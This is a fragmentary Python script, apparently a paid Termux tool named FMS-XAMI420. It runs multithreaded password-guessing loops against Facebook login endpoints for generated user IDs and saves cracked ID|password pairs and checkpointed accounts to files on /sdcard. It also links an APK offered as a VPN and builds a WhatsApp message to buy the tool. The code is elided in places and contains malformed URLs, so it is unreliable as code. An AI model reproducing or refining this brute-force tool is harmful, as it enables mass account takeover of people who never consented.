...
os.system('xdg-open https://facebook.com/termux780')
...
\033[1;37m██╔══\033[1;37m╝  ██║\033[1;37m╚██╔╝██║╚═\033[1;37m═══██║╚════╝██╔██╗ ██╔══██║██║╚██╔\033[1;37m╝██║██║
\033[1;37m██║     ██║ ╚═╝ ██║███████║     ██╔╝ ██╗██║  ██║██║ ╚═╝ ██║██║
\033[1;37m╚═╝     ╚═╝     ╚═╝╚═══\033[1;37m═══╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝╚═╝
  ☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️💥                                                            

----------------------------------------------
 \033[0;92m Author    : FMS XAMI
\033[0;92m  Github    : https://github.com/Fmsxami420/Fmsxami2024
 \033[0;92m Facebook  : MR.XAMI
\033[0;92m  Tool Name : FMS-XAMI420
\033[0;92m  Type type : PAID
 \033[0;92m Version   : 1.9.8
----------------------------------------------
 XAMI Pro version 1.9.8
 For Haters: TERA PAPPA ME
\033[1;37m----------------------------------------------""")
def linex():
        print('\033[1;37m----------------------------------------------')
def clear():
...
def public():
        ...
        try:
                ...
                login()
        try:
                info = requests.get('https://https://github.com/Fmsxami420/Fmsxami2024/?access_token='+tok,cookies = {"cookie":cok}).json()
                name=(info['name'])
        ...
        #       chk()
                ...
                if x == ("sex"):
                        ...
                        if xd in ['1','01']:
                                ...
                                os.system('xdg-open https://mediafire.com/file/y1wvgc2zqqunxbn/XAMI_VPN1.0.apk/file');menu()
                        elif xd in ['8','08']:
                                os.system('xdg-open https://https://www.facebook.com/termux780');menu()
                        elif xd in ['0','00']:
                                exit(' Thanks for use 🥰 ')
                        else:
                        ...
                        linex()
                        url_wa = "https://api.whatsapp.com/send?phone=+8801832618725&text="
                        name = input(" Enter your Name : ")
                        linex()
                        tks = ("Hi xami Sir, I Need To Buy Your Paid fmsxami PRO Tools Version 1.9.0 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)
                        subprocess.check_output(["am", "start", url_wa+(tks)]);time.sleep(2)
                        print(' Run :  python fmsxami.py')
                        exit()
        except ValueError:
                exit()
        except requests.exceptions.ConnectionError:
...
def pak():
                ...
                for nmbr in range(limit):
                        ...
                        user.append(nmp)
                with tred(max_workers=30) as XAMI:     
                        clear()
                        tl = str(len(user))
...
def bd():
                ...
                with tred(max_workers=30) as SHAMI:     
                        ...
                        for psx in user:
                                ...
                                fmaxami.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' The process has completed')
                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [FMS-XAMI] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in SHAMI:
                                ...
                                print('\r\r\033[1;32m [XAMI-OK] %s | %s'%(ids,pas))
                                open('/sdcard/XAMI-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in SHAMI:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [XAMI-CP] '+ids+' | '+pas+'\033[1;97m')
...
def api(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m [XAMI-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [XAMII-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/XAMI-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                                        ...
                                        if 'y' in pcp:
                                                print('\r\r\x1b[38;5;208m [XAMI-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/XAMI-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                else:
                                        continue
...
def api1(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [XAMI-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/XAMI-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                ...
                try:
                        ...
                        for pas in passlist:
                                ...
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/XAMI-OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m [XAMI-OK] '+uid+' | '+pas+'\033[1;97m')
                                                        open('/sdcard/XAMI-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;32m [XAMI-OK] '+uid+' | '+pas+'\033[1;97m')
